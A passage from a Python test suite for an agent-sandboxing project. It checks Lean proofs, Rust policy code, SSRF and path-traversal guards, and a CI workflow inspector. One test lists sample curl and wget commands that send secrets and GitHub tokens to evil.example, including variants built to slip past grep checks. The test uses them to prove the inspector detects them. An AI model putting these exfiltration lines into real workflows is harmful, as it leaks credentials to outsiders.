        self.assertIn("10000000", _read_repo_text("src/security/cedar_arm/policy_engine.rs"))
        self.assertIn("10_000_000", _read_repo_text("src/containment_ring/cedar_gate.rs"))

    def test_f7_b02_cedar_forbid_dominates_permit(self) -> None:
        """F7-BVA: Cedar evaluate with both matching Permit and Forbid policies evaluates to deny/false."""
        lean_path = common.require_milestone_file("formal/AgentOctopusFormal/CedarAndTemporal.lean", "F7")
        lean_text = common.strip_lean_comments(lean_path.read_text(encoding="utf-8"))
        self.assertRegex(lean_text, r"\btheorem\s+forbid_dominates_permit\b")

        m_fn = re.search(
            r"\bdef\s+(evalPolicySet|evaluatePolicySet|evaluate|evaluateCedar|evalCedar|evaluatePolicies|decideCedar|isAllowed)\b([\s\S]{0,250}?):\s*([A-Za-z_][A-Za-z0-9_']*)\s*:=",
            lean_text,
        )
        self.assertIsNotNone(m_fn, "CedarAndTemporal.lean must define a Cedar evaluate function")
        fn_name, sig_text, ret_type = m_fn.group(1), m_fn.group(2), m_fn.group(3)

        pol_struct = next(
            (name for name in ("CedarPolicy", "Policy", "CedarRule") if re.search(rf"\bstructure\s+{name}\b", lean_text)),
            "CedarPolicy",
        )
        req_struct = next(
            (
                name
                for name in ("CedarRequest", "ParcRequest", "CedarQuery", "PolicyRequest", "Request")
                if re.search(rf"\bstructure\s+{name}\b", lean_text)
            ),
            "CedarRequest",
        )
        eff_enum = next(
            (name for name in ("CedarEffect", "Effect", "PolicyEffect") if re.search(rf"\binductive\s+{name}\b", lean_text)),
            "Effect",
        )
        eff_ctors = common.parse_lean_inductive_constructors(lean_text, eff_enum)
        permit_ctor = next((c for c in eff_ctors if "permit" in c.lower()), "Permit")
        forbid_ctor = next((c for c in eff_ctors if "forbid" in c.lower()), "Forbid")

        pol_fields = _extract_lean_structure_fields(lean_text, pol_struct)
        eff_field = next(
            (fname for fname, _ in pol_fields if "effect" in fname.lower()),
            "effect",
        )
        permit_overrides: dict[str, str] = {eff_field: f".{permit_ctor}"}
        forbid_overrides: dict[str, str] = {eff_field: f".{forbid_ctor}"}
        if any(fname == "id" for fname, _ in pol_fields):
            permit_overrides["id"] = '"probe_permit"'
            forbid_overrides["id"] = '"probe_forbid"'
        permit_expr = _build_lean_struct_literal(lean_text, pol_struct, overrides=permit_overrides)
        forbid_expr = _build_lean_struct_literal(lean_text, pol_struct, overrides=forbid_overrides)

        req_fields = dict(_extract_lean_structure_fields(lean_text, req_struct))
        req_overrides: dict[str, str] = {}
        if "action" in req_fields and "resourceType" in req_fields:
            act_ctors = common.parse_lean_inductive_constructors(lean_text, req_fields["action"])
            res_ctors = common.parse_lean_inductive_constructors(lean_text, req_fields["resourceType"])
            if "extract" in act_ctors and "Document" in res_ctors:
                req_overrides["action"] = ".extract"
                req_overrides["resourceType"] = ".Document"
        req_expr = _build_lean_struct_literal(lean_text, req_struct, overrides=req_overrides)

        list_pos = sig_text.find("List")
        req_pos = sig_text.find(req_struct)
        list_first = list_pos != -1 and (req_pos == -1 or list_pos < req_pos)
        permit_only_call = (
            f"{fn_name} [permitPol] sampleReq"
            if list_first
            else f"{fn_name} sampleReq [permitPol]"
        )
        eval_call = (
            f"{fn_name} [permitPol, forbidPol] sampleReq"
            if list_first
            else f"{fn_name} sampleReq [permitPol, forbidPol]"
        )

        if ret_type == "Bool":
            permit_lhs, deny_lhs, deny_val, allow_val = permit_only_call, eval_call, "false", "true"
        elif re.search(rf"\binductive\s+{re.escape(ret_type)}\b", lean_text):
            verdict_ctors = common.parse_lean_inductive_constructors(lean_text, ret_type)
            deny_ctor = next((c for c in verdict_ctors if "deny" in c.lower() or "forbid" in c.lower()), "Deny")
            allow_ctor = next((c for c in verdict_ctors if "allow" in c.lower() or "permit" in c.lower()), "Allow")
            permit_lhs, deny_lhs, deny_val, allow_val = permit_only_call, eval_call, f".{deny_ctor}", f".{allow_ctor}"
        else:
            v_fields = _extract_lean_structure_fields(lean_text, ret_type)
            allow_field = next(
                (fname for fname, ftype in v_fields if ftype == "Bool"),
                "isAllowed",
            )
            permit_lhs, deny_lhs, deny_val, allow_val = (
                f"({permit_only_call}).{allow_field}",
                f"({eval_call}).{allow_field}",
                "false",
                "true",
            )

        header = (
            "import AgentOctopusFormal.CedarAndTemporal\n"
            "open AgentOctopusFormal in\n"
            f"def permitPol : {pol_struct} := {permit_expr}\n"
            "open AgentOctopusFormal in\n"
            f"def forbidPol : {pol_struct} := {forbid_expr}\n"
            "open AgentOctopusFormal in\n"
            f"def sampleReq : {req_struct} := {req_expr}\n"
        )
        probe_ok = (
            header
            + f"open AgentOctopusFormal in\nexample : {permit_lhs} = {allow_val} := by first | rfl | decide\n"
            + f"open AgentOctopusFormal in\nexample : {deny_lhs} = {deny_val} := by first | rfl | decide\n"
        )
        res_ok = common.run_lean_probe(probe_ok, use_lake_env=True)
        self.assertEqual(res_ok.returncode, 0, f"Cedar Permit+Forbid probe failed:\n{res_ok.combined_output}")

        probe_bad = header + f"open AgentOctopusFormal in\nexample : {deny_lhs} = {allow_val} := by first | rfl | decide\n"
        res_bad = common.run_lean_probe(probe_bad, use_lake_env=True)
        _assert_lean_mismatch_failure(self, res_bad)

    def test_f7_b03_tighten_only_rejects_permit_and_spoofed_principal(self) -> None:
        """F7-BVA: add_tighten_only_forbid_policy rejects Effect::Permit and CedarGate blocks spoofing."""
        common.require_milestone_file("formal/AgentOctopusFormal/CedarAndTemporal.lean", "F7")
        self.assertIn("Effect::Permit", _read_repo_text("src/security/cedar_arm/policy_engine.rs"))
        self.assertIn("CEDAR_PRINCIPAL_SPOOF_BLOCKED", _read_repo_text("src/containment_ring/cedar_gate.rs"))

    def test_f7_b04_dogwood_malformed_temporal_clause_fails_closed(self) -> None:
        """F7-BVA: DogwoodTemporalEngine fails closed on parse errors and proves temporal_fail_closed."""
        common.require_milestone_file("formal/AgentOctopusFormal/CedarAndTemporal.lean", "F7")
        mod_rs = _read_repo_text("src/security/cedar_arm/temporal/mod.rs")
        self.assertIn("DogwoodParser::parse", mod_rs)
        self.assertRegex(
            (common.FORMAL_PKG_DIR / "CedarAndTemporal.lean").read_text(encoding="utf-8"),
            r"\btheorem\s+temporal_fail_closed\b",
        )

    def test_f7_b05_cedar_rogue_adversary_unconditionally_blocked(self) -> None:
        """F7-BVA: DEFAULT_OCTOPUS_POLICIES unconditionally forbids rogue_adversary."""
        common.require_milestone_file("formal/AgentOctopusFormal/CedarAndTemporal.lean", "F7")
        self.assertIn("rogue_adversary", _read_repo_text("src/security/cedar_arm/policy_engine.rs"))

    # =======================================================================
    # F8: Mandate Attenuation & M-of-N Quorum Boundary Probes (5 tests — M3)
    # =======================================================================

    def test_f8_b01_mandate_depth_9_exceeds_max_8_rejected(self) -> None:
        """F8-BVA: Mandate depth > 8 returns MaxDelegationDepthExceeded."""
        common.require_milestone_file("formal/AgentOctopusFormal/MandateAndQuorum.lean", "F8")
        rust_m = _read_repo_text("src/security/agentmesh/mandate_attenuation.rs")
        self.assertEqual(common.parse_rust_const_int(rust_m, "MAX_DELEGATION_DEPTH"), 8)
        self.assertIn("MaxDelegationDepthExceeded", rust_m)

    def test_f8_b02_mandate_http_scheme_and_raw_ip_rejected(self) -> None:
        """F8-BVA: validate_mesh_uri rejects http://, raw IPv4/IPv6, decimal u32 IP, ports, and @."""
        common.require_milestone_file("formal/AgentOctopusFormal/MandateAndQuorum.lean", "F8")
        rust_m = _read_repo_text("src/security/agentmesh/mandate_attenuation.rs")
        for token in ("169.254.", "127.0.0.1", "%2e", "%00"):
            self.assertIn(token, rust_m)

    def test_f8_b03_mandate_scope_widening_and_expiry_clamped(self) -> None:
        """F8-BVA: Mandate attenuation clamps expiry and proves mandate_monotonic_attenuation."""
        common.require_milestone_file("formal/AgentOctopusFormal/MandateAndQuorum.lean", "F8")
        probe = (
            "import AgentOctopusFormal.MandateAndQuorum\n"
            "#check @AgentOctopusFormal.mandate_monotonic_attenuation\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f8_b04_quorum_duplicate_authority_sybil_rejected(self) -> None:
        """F8-BVA: QuorumPolicyGuard rejects duplicate signer (DuplicateAuthority) anti-sybil."""
        common.require_milestone_file("formal/AgentOctopusFormal/MandateAndQuorum.lean", "F8")
        rust_q = _read_repo_text("src/ledger/quorum.rs")
        self.assertIn("DuplicateAuthority", rust_q)
        probe = (
            "import AgentOctopusFormal.MandateAndQuorum\n"
            "#check @AgentOctopusFormal.quorum_threshold_anti_sybil\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f8_b05_quorum_below_threshold_rejected(self) -> None:
        """F8-BVA: QuorumPolicyGuard rejects < quorum_threshold valid unique signatures (QuorumNotMet)."""
        common.require_milestone_file("formal/AgentOctopusFormal/MandateAndQuorum.lean", "F8")
        self.assertIn("QuorumNotMet", _read_repo_text("src/ledger/quorum.rs"))

    # =======================================================================
    # F9: Isolation, SSRF, TokenPosture, Shield & Sentinel Probes (8 tests — M4)
    # =======================================================================

    def test_f9_b01_path_traversal_and_percent_encoded_rejected(self) -> None:
        """F9-BVA: validate_sandbox_relative_path blocks .., %2e, %2f, %5c, %00 and Lean proves path_join_no_escape."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_b = _read_repo_text("src/security/breakouts/mod.rs")
        for tok in ("%2e", "%2f", "%5c", "%00", "ParentDir"):
            self.assertIn(tok, rust_b)

    def test_f9_b02_path_drive_letter_unc_and_ntfs_ads_rejected(self) -> None:
        """F9-BVA: Sandbox path guard blocks drive letters/ADS (`:`), UNC (`\\\\`), and reparse points."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_b = _read_repo_text("src/security/breakouts/mod.rs")
        self.assertIn("FILE_ATTRIBUTE_REPARSE_POINT", rust_b)
        self.assertIn("nNumberOfLinks", rust_b)

    def test_f9_b03_ssrf_ipv4_imds_cgnat_wireserver_rejected(self) -> None:
        """F9-BVA: Egress proxy blocks IMDS 169.254.0.0/16, CGNAT 100.64.0.0/10, Azure 168.63.129.16, RFC1918."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_eg = _read_repo_text("src/containment_ring/egress_proxy.rs")
        for token in ("168, 63, 129, 16", "is_restricted_rebinding_ip", "validate_agent_egress_url"):
            self.assertIn(token, rust_eg)

    def test_f9_b04_ssrf_ipv6_mapped_ula_link_local_rejected(self) -> None:
        """F9-BVA: Egress proxy blocks IPv6 ::1, fc00::/7, fe80::/10, and ::ffff:0:0/96."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_eg = _read_repo_text("src/containment_ring/egress_proxy.rs")
        self.assertIn("to_ipv4_mapped", rust_eg)
        self.assertIn("ssrf_blocks_all_restricted_ranges", (common.FORMAL_PKG_DIR / "IsolationAndPerimeter.lean").read_text(encoding="utf-8"))

    def test_f9_b05_token_posture_integrity_high_0x3000_rejected(self) -> None:
        """F9-BVA: TokenPosture rejects integrity_rid > 0x2000 (0x3000 INTEGRITY_HIGH) and 13 dangerous privileges."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_tp = _read_repo_text("src/security/token_posture.rs")
        self.assertEqual(common.parse_rust_const_int(rust_tp, "INTEGRITY_HIGH"), 0x3000)
        self.assertIn("verify_agent_safe", rust_tp)

    def test_f9_b06_pre_resume_gate_fails_on_any_false_flag(self) -> None:
        """F9-BVA: evaluate_pre_resume_confinement_gate fails closed if suspended/appcontainer/job flags are false."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_ws = _read_repo_text("src/security/windows_sandbox.rs")
        self.assertIn("evaluate_pre_resume_confinement_gate", rust_ws)
        probe = (
            "import AgentOctopusFormal.IsolationAndPerimeter\n"
            "#check @AgentOctopusFormal.pre_resume_no_elevated_uncontained_child\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertEqual(res.returncode, 0, res.combined_output)

    def test_f9_b07_shield_latch_cannot_clear_while_reboot_pending(self) -> None:
        """F9-BVA: VirtualPatchShieldStore forbids clearing shield_locked_until_reboot when reboot pending."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        rust_sh = _read_repo_text("src/security/virtual_patch_shield.rs")
        self.assertIn("confirm_reboot_cleared", rust_sh)
        self.assertIn("shield_locked_until_reboot", rust_sh)

    def test_f9_b08_sentinel_non_exhaustive_match_and_unhealthy_lockdown(self) -> None:
        """F9-BVA: Non-exhaustive match on SentinelAction fails Lean and !supervisor_healthy triggers LockdownSystem."""
        common.require_milestone_file("formal/AgentOctopusFormal/IsolationAndPerimeter.lean", "F9")
        probe = (
            "import AgentOctopusFormal.IsolationAndPerimeter\n"
            "def badSentinel : AgentOctopusFormal.SentinelAction -> Nat\n"
            "  | .Continue => 0\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=True)
        self.assertNotEqual(res.returncode, 0)
        self.assertIn("!supervisor_healthy", _read_repo_text("src/containment_ring/sentinel.rs"))

    # =======================================================================
    # F10: Master Theorems & Axiom Gate Negative Probes (5 tests)
    # =======================================================================

    def test_f10_b01_sorry_probe_detected_by_lean_compiler(self) -> None:
        """F10-BVA: Lean compiler flags `sorry` via warning and `sorryAx` in `#print axioms`."""
        probe = (
            "theorem fake_sorry_probe : False := by sorry\n"
            "#print axioms fake_sorry_probe\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=False)
        out = res.combined_output
        self.assertTrue(
            "sorry" in out.lower() or "sorryAx" in out,
            f"Lean compiler failed to surface sorry/sorryAx:\n{out}",
        )

    def test_f10_b02_custom_axiom_probe_detected_by_print_axioms(self) -> None:
        """F10-BVA: `#print axioms` and multiline parser surface any injected custom `axiom` declaration."""
        multiline_out = (
            "'fake_ax_probe' depends on axioms: [propext,\n"
            "  Classical.choice,\n"
            "  rogue_backdoor_axiom]\n"
        )
        self.assertEqual(common.find_rogue_axioms_in_output(multiline_out), ["rogue_backdoor_axiom"])
        probe = (
            "axiom rogue_backdoor_axiom : False\n"
            "theorem fake_ax_probe : False := rogue_backdoor_axiom\n"
            "#print axioms fake_ax_probe\n"
        )
        res = common.run_lean_probe(probe, use_lake_env=False)
        self.assertEqual(res.returncode, 0, res.combined_output)
        self.assertIn("rogue_backdoor_axiom", res.combined_output)
        self.assertIn("rogue_backdoor_axiom", common.find_rogue_axioms_in_output(res.combined_output))

    def test_f10_b03_static_sorry_scanner_catches_code_ignores_comments(self) -> None:
        """F10-BVA: find_lean_sorry_tokens ignores comments, char '\"', strings, and sorry' while catching sorry/sorryAx."""
        sample = (
            "-- do not use sorry here\n"
            "/- nested /- sorry -/ comment -/\n"
            "theorem t : True := by sorry\n"
        )
        hits = common.find_lean_sorry_tokens(sample)
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0][0], 3)

        safe_sample = (
            "def q : Char := '\"'\n"
            "-- sorry\n"
            'def msg : String := "sorry"\n'
            "def sorry' : Nat := 1\n"
            "theorem ok : True := trivial\n"
        )
        self.assertEqual(common.find_lean_sorry_tokens(safe_sample), [])
        ax_hits = common.find_lean_sorry_tokens("def x := sorryAx\n")
        self.assertEqual(len(ax_hits), 1)

    def test_f10_b04_static_axiom_scanner_catches_axiom_ignores_comments(self) -> None:
        """F10-BVA: find_lean_custom_axioms catches modifiers/attrs/semicolons/guillemets and ignores comments/strings."""
        sample = (
            "-- axiom commented_out : False\n"
            "/- axiom blocked : False -/\n"
            "axiom injected_hole : False\n"
        )
        hits = common.find_lean_custom_axioms(sample)
        self.assertEqual(hits, [(3, "injected_hole")])

        adv = (
            "unsafe axiom unsafe_ax : False\n"
            "noncomputable axiom nc_ax : False\n"
            '@[extern "c_fn"] axiom ext_ax : Nat\n'
            "scoped axiom scoped_ax : False\n"
            "local axiom local_ax : False\n"
            "def x := 1; axiom semi_ax : False\n"
            "axiom «escaped_ax» : False\n"
            "inductive AxiomKind where | Classical\n"
            "def axiom_check : Nat := 0\n"
            'def s : String := "axiom in_string : False"\n'
        )
        adv_names = [name for _, name in common.find_lean_custom_axioms(adv)]
        self.assertEqual(
            adv_names,
            ["unsafe_ax", "nc_ax", "ext_ax", "scoped_ax", "local_ax", "semi_ax", "«escaped_ax»"],
        )

        self.assertEqual(
            common.find_lean_custom_axioms("axiom\n  multiline_ax : False\n"),
            [(1, "multiline_ax")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms("axiom /-\n-/ split_ax : False\n"),
            [(1, "split_ax")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms("axiom α_backdoor : False\n"),
            [(1, "α_backdoor")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms("axiom poly.{u} : Type u\n"),
            [(1, "poly")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms("axiom Foo.bar : False\n"),
            [(1, "Foo.bar")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms("axiom Foo.«bar» : False\n"),
            [(1, "Foo.«bar»")],
        )
        self.assertEqual(
            common.find_lean_custom_axioms(
                "inductive AxiomKind where | Classical\ndef axiom_check : Nat := 0\n"
            ),
            [],
        )

    def test_f10_b05_axiom_audit_fails_if_no_breach_omitted_check(self) -> None:
        """F10-BVA: AxiomAudit.lean must audit both no_breakout and no_breach and import NoBreachNoBreakout."""
        audit_path = common.require_milestone_file("formal/AgentOctopusFormal/AxiomAudit.lean", "F10")
        txt = common.strip_lean_comments(audit_path.read_text(encoding="utf-8"))
        self.assertIn("NoBreachNoBreakout", txt)
        self.assertRegex(txt, r"#print\s+axioms[^\n]*no_breakout")
        self.assertRegex(txt, r"#print\s+axioms[^\n]*no_breach")

    # =======================================================================
    # F11: Rust-to-Lean Coupling Negative Sensitivity Probes (5 tests)
    # =======================================================================

    def test_f11_b01_rust_enum_parser_detects_missing_variant_drift(self) -> None:
        """F11-BVA: Enum parser detects simulated 17-variant drift and handles #[doc = \"}\"] / \"a,b\" literals."""
        drifted_rust = "pub enum ArmRole {\n  UntrustedDocIngest,\n  AccountingLedgerWrite,\n}\n"
        parsed = common.parse_rust_enum_variants(drifted_rust, "ArmRole")
        self.assertEqual(len(parsed), 2)
        self.assertNotEqual(len(parsed), 18)

        attr_rust = (
            'pub enum AttrRole {\n'
            '    #[doc = "}"]\n'
            '    Alpha,\n'
            '    #[doc = "a,b"]\n'
            '    Beta,\n'
            '}\n'
        )
        self.assertEqual(common.parse_rust_enum_variants(attr_rust, "AttrRole"), ["Alpha", "Beta"])
        self.assertEqual(
            common.parse_rust_enum_variants('pub enum R { #[doc = "}"] A, B }', "R"),
            ["A", "B"],
        )

    def test_f11_b02_lean_inductive_parser_detects_missing_constructor_drift(self) -> None:
        """F11-BVA: Inductive parser detects drift, private/same-line ctors, and stops before example match."""
        drifted_lean = (
            "inductive ArmState : Type where\n"
            "  | Created\n"
            "  | Completed\n"
            "  deriving DecidableEq\n"
        )
        parsed = common.parse_lean_inductive_constructors(drifted_lean, "ArmState")
        self.assertEqual(len(parsed), 2)
        self.assertNotEqual(len(parsed), 6)

        adv_lean = (
            "private inductive PrivDemo where | One | Two\n\n"
            "example : Nat := match 0 with\n"
            "  | zero => 0\n"
            "  | succ n => n\n"
        )
        self.assertEqual(common.parse_lean_inductive_constructors(adv_lean, "PrivDemo"), ["One", "Two"])

    def test_f11_b03_const_parity_parser_detects_value_drift(self) -> None:
        """F11-BVA: Constant parsers compare parse_lean_def_nat vs parse_rust_const_int on 15 vs 16 drift."""
        lean_val = common.parse_lean_def_nat("def MAX_RELAY_HOPS : Nat := 15", "MAX_RELAY_HOPS")
        rust_val = common.parse_rust_const_int(
            _read_repo_text("src/containment_ring/mesh_guard.rs"), "MAX_RELAY_HOPS"
        )
        self.assertEqual(lean_val, 15)
        self.assertEqual(rust_val, 16)
        self.assertNotEqual(lean_val, rust_val)

    def test_f11_b04_coupling_test_covers_all_10_lean_modules(self) -> None:
        """F11-BVA: tests/lean_formal_coupling_tests.rs covers all 9 formal submodules + AxiomAudit."""
        rs_path = common.require_milestone_file("tests/lean_formal_coupling_tests.rs", "F11")
        txt = rs_path.read_text(encoding="utf-8")
        for mod in (
            "CoreTypes",
            "FsmContainment",
            "HomologicalMesh",
            "EpochAutotomy",
            "CageNoDirectBind",
            "CedarAndTemporal",
            "MandateAndQuorum",
            "IsolationAndPerimeter",
            "NoBreachNoBreakout",
        ):
            self.assertIn(mod, txt, f"Coupling test missing reference to {mod}")

    def test_f11_b05_coupling_test_exercises_negative_boundaries(self) -> None:
        """F11-BVA: tests/lean_formal_coupling_tests.rs tests negative runtime boundary rejections."""
        rs_path = common.require_milestone_file("tests/lean_formal_coupling_tests.rs", "F11")
        txt = rs_path.read_text(encoding="utf-8")
        self.assertTrue(
            any(tok in txt for tok in ("10_000_001", "Quarantined", "169.254.169.254", "is_err()")),
            "Coupling test must include negative boundary assertions",
        )

    # =======================================================================
    # F12: Lean Verification CI Workflow Negative Probes (6 tests)
    # =======================================================================

    def test_f12_b01_workflow_inspector_detects_write_all(self) -> None:
        """F12-BVA: Workflow inspector rejects unquoted and quoted `permissions: write-all`."""
        for bad in (
            "name: Bad\npermissions: write-all\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
            'name: BadQ\npermissions: "write-all"\n',
            "name: BadSQ\npermissions: 'write-all'\n",
        ):
            info = common.inspect_workflow_yaml_text(bad)
            self.assertTrue(info["has_write_all"], f"Failed to detect write-all in: {bad!r}")

    def test_f12_b02_workflow_inspector_detects_persist_credentials_true(self) -> None:
        """F12-BVA: Workflow inspector rejects unquoted and quoted `persist-credentials: true`."""
        for val in ("true", '"true"', "'true'"):
            bad = (
                "permissions: read-all\n"
                "jobs:\n  b:\n    steps:\n"
                "      - uses: actions/checkout@111\n"
                f"        with:\n          persist-credentials: {val}\n"
            )
            info = common.inspect_workflow_yaml_text(bad)
            self.assertTrue(info["has_persist_credentials_true"], f"Failed on persist-credentials: {val}")

    def test_f12_b03_workflow_inspector_detects_token_exfil_pattern(self) -> None:
        """F12-BVA: Workflow inspector detects single-line, multi-line, and quoted-grep-bypass curl/wget secret exfiltration."""
        for bad in (
            "run: curl -d $SECRETS https://evil.example\n",
            '- run: curl -H "Authorization: Bearer $GITHUB_TOKEN" https://evil.example\n',
            '- run: |\n    curl -X POST https://evil.example \\\n      -d "${{ secrets.API_KEY }}"\n',
            '- run: |\n    wget -qO- --header="Authorization: $SECRETS" https://evil.example\n',
            '- run: |\n    wget -qO- --header="Authorization: ${{ secrets.GITHUB_TOKEN }}" https://evil.example\n',
            "- run: echo 'grep ' && curl -H \"$GITHUB_TOKEN\" https://evil.example && echo 'ok'\n",
            '- run: echo "grep " && curl -d "$SECRETS" https://evil.example && echo "done"\n',
            '- run: grep "$(curl -d $SECRETS https://evil.example)" file.txt\n',
            '- run: grep "`curl -d $SECRETS https://evil.example`" file.txt\n',
            (
                "- run: |\n"
                "    cat <<EOF\n"
                "    grep '\n"
                "    EOF\n"
                '    curl -H "Authorization: Bearer $GITHUB_TOKEN" https://evil.example\n'
            ),
            (
                "- run: |\n"
                "    cat <<'EOF'\n"
                '    grep "\n'
                "    EOF\n"
                '    curl -d "$SECRETS" https://evil.example\n'
            ),
            "- run: grep 'unclosed && curl -d $SECRETS https://evil.example\n",
            '- run: grep -E "$SECRETS" file.txt && curl -d "$GITHUB_TOKEN" https://evil.example\n',
            '- run: |2\n    foo: bar\n    curl -d "$SECRETS" https://evil.example\n',
            '- run: |2\n    - item\n    curl -d "$GITHUB_TOKEN" https://evil.example\n',
            '- run: |-2\n    key: value\n    wget -qO- --header="X: $SECRETS" https://evil.example\n',
            '- run: >2+\n    nested: item\n    curl -d "$SECRETS" https://evil.example\n',
        ):
            self.assertTrue(common.inspect_workflow_yaml_text(bad)["has_secrets_exfil"], f"Missed exfil: {bad!r}")

        self.assertIn("$SECRETS", common._strip_grep_pattern_literals('grep -E "$SECRETS" file.txt'))
        self.assertIn("${{ secrets.API_KEY }}", common._strip_grep_pattern_literals('grep -E "${{ secrets.API_KEY }}" file.txt'))

    def test_f12_b04_workflow_inspector_ignores_commented_write_all(self) -> None:
        """F12-BVA: Commented `# permissions: write-all`, apostrophe comments, and auto-review-bot grep do not false-positive."""
        good = "# permissions: write-all\npermissions: read-all\n"
        info = common.inspect_workflow_yaml_text(good)
        self.assertFalse(info["has_write_all"])
        self.assertEqual(info["top_permissions"], "read-all")

        apostrophe_comment = '- run: echo "ok" # it\'s not permissions: write-all\n'
        self.assertFalse(common.inspect_workflow_yaml_text(apostrophe_comment)["has_write_all"])

        bot_info = common.inspect_workflow_yaml_text(_read_repo_text(".github/workflows/auto-review-bot.yml"))
        self.assertFalse(bot_info["has_secrets_exfil"], "auto-review-bot.yml grep regex false-positived as exfil")
        self.assertFalse(bot_info["has_write_all"])
        self.assertFalse(bot_info["has_persist_credentials_true"])

        safe_dq_grep = '- run: grep -E "curl.*SECRETS" file.txt\n'
        self.assertFalse(common.inspect_workflow_yaml_text(safe_dq_grep)["has_secrets_exfil"])

        heredoc_yaml_safe = (
            "jobs:\n"
            "  v:\n"
            "    steps:\n"
            "      - run: |\n"
            "          cat <<EOF > m.txt\n"
            "          grep '\n"
            "          EOF\n"
            "          grep -E 'curl.*$SECRETS' m.txt\n"
        )
        self.assertFalse(common.inspect_workflow_yaml_text(heredoc_yaml_safe)["has_secrets_exfil"])

    def test_f12_b05_lean_verify_workflow_forbids_continue_on_error(self) -> None:
        """F12-BVA: lean-verify.yml must not weaken gates with `continue-on-error: true`."""
        wf = common.require_milestone_file(".github/workflows/lean-verify.yml", "F12")
        txt = common.inspect_workflow_yaml_text(wf.read_text(encoding="utf-8"))["non_comment_text"]
        self.assertIsNone(re.search(r"continue-on-error:\s*true\b", txt, re.IGNORECASE))

    def test_f12_b06_raptor_sarif_gate_forbids_zero_sarif_pass(self) -> None:
        """F12-BVA: raptor-security.yml fail-closed gate enforces `len(sarif_files) > 0`."""
        raptor_yml = _read_repo_text(".github/workflows/raptor-security.yml")
        self.assertIn("len(sarif_files) > 0", raptor_yml)
        self.assertIn("critical_unmitigated == 0", raptor_yml)

    # =======================================================================
    # F13: E2E Suite Self-Integrity Negative Sensitivity Probes (5 tests)
    # =======================================================================

    def test_f13_b01_ast_checker_catches_non_stdlib_import(self) -> None:
        """F13-BVA: AST validator flags non-stdlib imports like `import yaml` or `import requests`."""
        with tempfile.TemporaryDirectory(prefix="ao_ast_neg_") as tmpdir:
            p = Path(tmpdir) / "bad_imports.py"
            p.write_text("import yaml\nimport requests\n", encoding="utf-8")
            hits = common.check_stdlib_only_python_file(p)
            self.assertEqual(len(hits), 2)

    def test_f13_b02_funny_char_scanner_catches_all_control_and_ufffd(self) -> None:
        """F13-BVA: Funny-char scanner flags BEL/BS/VT/FF/ESC/NUL/U+FFFD while allowing TAB/LF/CR."""
        bad = "ok\t\n\r" + "\x00\x07\x08\x0b\x0c\x1b\ufffd"
        hits = common.check_funny_chars_in_text(bad, "probe")
        self.assertEqual(len(hits), 7)
        self.assertEqual(common.check_funny_chars_in_text("clean\tline\r\n", "clean"), [])

    def test_f13_b03_raptor_scanner_catches_yaml_load_shell_eval_mktemp_pem(self) -> None:
        """F13-BVA: RAPTOR Python scanner catches yaml.load, shell=True, eval, mktemp, and PEM header."""
        pem_hdr = "-----BEGIN " + "RSA PRIVATE KEY-----"
        bad_py = (
            "import subprocess, tempfile, yaml\n"
            "x = yaml.load('{}')\n"
            "subprocess.run('echo hi', shell=True)\n"
            "eval('1+1')\n"
            "p = tempfile.mktemp()\n"
            f'k = "{pem_hdr}"\n'
        )
        hits = common.scan_raptor_python_anti_patterns(bad_py, "bad_probe.py")
        self.assertGreaterEqual(len(hits), 5, f"Expected >=5 RAPTOR hits, got {hits}")
        shell_int_hits = common.scan_raptor_python_anti_patterns(
            "import subprocess\nsubprocess.run('id', shell=1)\n", "shell_int.py"
        )
        self.assertGreaterEqual(len(shell_int_hits), 1, f"Expected shell=1 to be flagged: {shell_int_hits}")
        self.assertEqual(
            common.scan_raptor_python_anti_patterns(
                "import subprocess\nsubprocess.run(['echo', 'ok'], shell=False)\n", "safe_shell.py"
            ),
            [],
        )

    def test_f13_b04_strict_exit_gate_rejects_skipped_tests(self) -> None:
        """F13-BVA: Runner exit gate returns 1 when skipped > 0 in strict mode and rejects --all --progressive (exit 2)."""
        from . import run_e2e_suite

        self.assertEqual(
            run_e2e_suite.compute_exit_code(was_successful=True, skipped_count=1, progressive=False),
            1,
        )
        self.assertEqual(
            run_e2e_suite.compute_exit_code(was_successful=True, skipped_count=0, progressive=False),
            0,
        )
        with self.assertRaises(SystemExit) as ctx:
            run_e2e_suite.build_parser().parse_args(["--all", "--progressive"])
        self.assertEqual(ctx.exception.code, 2)

    def test_f13_b05_progressive_exit_gate_fails_on_real_failure(self) -> None:
        """F13-BVA: Progressive mode allows skips (0) only when was_successful=True, else returns 1."""
        from . import run_e2e_suite

        self.assertEqual(
            run_e2e_suite.compute_exit_code(was_successful=True, skipped_count=5, progressive=True),
            0,
        )
        self.assertEqual(
            run_e2e_suite.compute_exit_code(was_successful=False, skipped_count=5, progressive=True),
            1,
        )

    # =======================================================================
    # F14: Shipping, Packaging & Repo Hygiene Negative Probes (5 tests)
    # =======================================================================

    def test_f14_b01_isolated_package_audit_excludes_lake_and_target(self) -> None:
        """F14-BVA: package_agent_octopus EXCLUDE_DIRS prunes .lake/.git/target/.agents on a staged tree."""
        import importlib.util
        import zipfile

        pkg_script = common.REPO_ROOT / "scripts" / "package_agent_octopus.py"
